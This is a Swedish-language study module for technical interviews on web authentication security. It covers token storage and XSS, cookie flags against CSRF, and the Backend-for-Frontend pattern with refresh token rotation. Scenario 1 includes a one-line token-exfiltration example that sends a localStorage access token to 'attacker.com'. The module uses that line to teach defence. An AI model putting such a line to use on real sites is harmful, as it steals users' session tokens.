# 🔐 03-auth-session-flow: BFF Pattern, HttpOnly Cookies & XSS vs CSRF

Denna modul täcker 3 fundamentala autentiserings- och säkerhetsarkitekturer i moderna webbapplikationer. Varje scenario presenterar problemet (vad som kraschar och varför vi bryr oss), dess specifika **Keyword Bingo** (facit-lingo), samt ett **Verklighets-svar (30–60 sek)** skräddarsytt för tekniska intervjuer.

---

## 1. Koncept & Scenarier

### Scenario 1: JWT i LocalStorage & XSS Exfiltration (Supply Chain Attacks)

#### 1. Problem: Vad kraschar eller varför bryr vi oss?
I många SPA-appar tar klienten emot en JWT Access Token vid inloggning och sparar den i `localStorage.setItem('access_token', token)`.

**Detta är en allvarlig säkerhetsrisk:** `localStorage` är fullt tillgängligt för all JavaScript som körs i webbläsarkontexten. Om en enda XSS-sårbarhet uppstår – eller om ett tredjeparts npm-paket i applikationens beroendeträd komprometteras (**Supply Chain Attack**) – kan en angripare exfiltrera alla användares tokens med en enda rad kod:
```javascript
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'));
```
Angriparen kan därefter agera som användaren tills tokenet löper ut, utan att det går att återkalla från klienten.

#### 2. Keyword Bingo (Facit-lingo)
* **XSS (Cross-Site Scripting):** Säkerhetssårbarhet där en angripare kan injicera och exekvera godtycklig JavaScript i användarens webbläsarkontext.
* **Supply Chain Attack:** Angrepp där skadlig kod smugglas in via komprometterade npm-bibliotek.
* **Token Exfiltration:** Obehörig utläsning och stöld av känsliga autentiseringstokens via JavaScript.
* **Storage Insecurity:** Insikten att varken `localStorage` eller `sessionStorage` erbjuder något skydd mot skript som körs på sidan.
* **Bearer Token Theft:** När ett stulet token kan användas direkt mot API:er utan ytterligare autentisering.

#### 3. Verklighets-svar (30–60 sek)
> *"Att lagra JWT-tokens i `localStorage` är en stor säkerhetsrisk eftersom all JavaScript på sidan har full åtkomst till lagringen. En enda XSS-sårbarhet eller ett infekterat npm-paket räcker för att en angripare ska kunna stjäla tokenet och kapa sessionen. I professionella system sparar vi aldrig känsliga access tokens i `localStorage`. Istället använder vi `HttpOnly`-cookies eller ett BFF-mönster där webbläsarens JavaScript över huvud taget inte kan läsa eller manipulera autentiseringsuppgifterna."*

**Labb & Kod:** [FlawedLocalStorageAuth.ts](file:///frontend/03-auth-session-flow/FlawedLocalStorageAuth.ts) vs [BffCookieAuth.ts](file:///frontend/03-auth-session-flow/BffCookieAuth.ts)

---

### Scenario 2: HttpOnly, Secure & SameSite Cookies (CSRF- och XSS-skydd)

#### 1. Problem: Vad kraschar eller varför bryr vi oss?
Att gå från `localStorage` till vanliga cookies löser inte säkerheten om cookien saknar korrekta säkerhetsflaggor. Om en cookie saknar `HttpOnly` kan den fortfarande stjälas via `document.cookie`.

Om den saknar `SameSite`-skydd blir applikationen sårbar för **CSRF (Cross-Site Request Forgery)**: en illasinnad webbplats kan lura användarens webbläsare att automatiskt skicka med session-cookien i ett dolt POST-anrop (t.ex. till `/api/transfer-funds`).

#### 2. Keyword Bingo (Facit-lingo)
* **`HttpOnly` Flagga:** Förbjuder all åtkomst till kakan via JavaScript (`document.cookie`), vilket helt neutraliserar tokenstöld via XSS!
* **`Secure` Flagga:** Garanterar att kakan uteslutande skickas över krypterade HTTPS-anslutningar.
* **`SameSite=Lax` / `SameSite=Strict`:** Webbläsarskydd mot CSRF genom att förhindra att kakan bifogas i förfrågningar från externa tredjepartsdomäner.
* **CSRF (Cross-Site Request Forgery):** Angrepp där en extern sajt utnyttjar användarens automatiskt bifogade autentiseringsuppgifter.
* **CSRF Token / Anti-Forgery Token:** Kompletterande engångs-token för mutationer som krävs vid äldre eller publika cross-origin API:er.

#### 3. Verklighets-svar (30–60 sek)
> *"För att säkra sessioner utan att exponera tokens för JavaScript använder vi cookies med tre obligatoriska flaggor: `HttpOnly`, `Secure` och `SameSite=Lax`. `HttpOnly` gör att kakan är helt osynlig för `document.cookie`, vilket eliminerar tokenstöld via XSS. `Secure` kräver krypterad HTTPS-transport, och `SameSite=Lax` blockerar kakan från att skickas med vid anrop från externa sajter, vilket i grunden oskadliggör CSRF-attacker utan komplex token-overhead."*

**Labb & Kod:** [BffCookieAuth.ts](file:///frontend/03-auth-session-flow/BffCookieAuth.ts) & [AuthSecurity.test.ts](file:///frontend/03-auth-session-flow/AuthSecurity.test.ts)

---

### Scenario 3: BFF Pattern (Backend-for-Frontend) & Token Rotation

#### 1. Problem: Vad kraschar eller varför bryr vi oss?
I en ren mikrotjänstarkitektur har klienten ofta ett SPA som behöver kommunicera med tiotals interna tjänster. Att låta klienten hantera OAuth2/OIDC token-refresh, JWT-validering och kryptonycklar skapar en enorm säkerhetsyta i webbläsaren.

Om ett Refresh Token läcker har angriparen permanent tillgång till kontot.

#### 2. Keyword Bingo (Facit-lingo)
* **BFF Pattern (Backend-for-Frontend):** Ett serverlager (Node.js/Next.js/Spring Cloud Gateway) som agerar säkerhetsbrygga mellan SPA och interna mikrotjänster.
* **Session Cookie till Bearer Token Exchange:** BFF tar emot den krypterade HttpOnly-cookien från webbläsaren och injicerar en kortlivad `Authorization: Bearer <JWT>` mot interna mikrotjänster.
* **Refresh Token Rotation (RTR):** Varje gång ett refresh-token används förbrukas det och ett nytt utfärdas. Om ett redan förbrukat token presenteras ogiltigförklaras omedelbart hela sessionsträdet (upptäcker stöld!).
* **Token Revocation:** Möjligheten att omedelbart spärra en session från servern utan att vänta på att JWT löper ut.

#### 3. Verklighets-svar (30–60 sek)
> *"BFF-mönstret (Backend-for-Frontend) är standarden för säker webbautentisering i företagssystem. Klienten pratar enbart med BFF-servern via säkra HttpOnly session-cookies. BFF-lagret hanterar OAuth2 Authorization Code Flow med PKCE, lagrar tokens på serversidan och injicerar Bearer JWT:er i anropen mot de interna mikrotjänsterna. Genom att implementera Refresh Token Rotation där varje token förbrukas vid användning, kan systemet omedelbart upptäcka om ett token har stulits och spärra hela sessionen i realtid."*

**Labb & Kod:** [BffCookieAuth.ts](file:///frontend/03-auth-session-flow/BffCookieAuth.ts)

---

## 2. Felsökningsguide (Kommandon & Verktyg)

### A. Inspektera Cookie-flaggor i DevTools
1. Öppna Chrome DevTools -> **Application** -> **Cookies**.
2. Verifiera följande kolumner:
   * **HttpOnly:** Måste ha en bockmarkering (skyddar mot JS-läsning).
   * **Secure:** Måste ha en bockmarkering (kräver HTTPS).
   * **SameSite:** Ska vara satt till `Lax` eller `Strict` (skyddar mot CSRF).

### B. Testa XSS-sårbarhet i Console
Kör i utvecklarkonsolen:
```javascript
console.log(document.cookie);
// Om sessionskakan skrivs ut här saknas HttpOnly och är sårbar för XSS!
```

---

## 3. Koden & Verifiering

* **The Flaw:** [FlawedLocalStorageAuth.ts](file:///frontend/03-auth-session-flow/FlawedLocalStorageAuth.ts) – Lagrar hemliga tokens i `localStorage` tillgängligt för XSS.
* **The Fix:** [BffCookieAuth.ts](file:///frontend/03-auth-session-flow/BffCookieAuth.ts) – Sätter säkra HttpOnly-cookies och isolerar tokens till servern.
* **Verification Test:** [AuthSecurity.test.ts](file:///frontend/03-auth-session-flow/AuthSecurity.test.ts) – Simulerar angreppsvektor mot localStorage vs HttpOnly skydd.

---

## 4. Så här kör du testerna

```bash
cd frontend/03-auth-session-flow
npm test
```
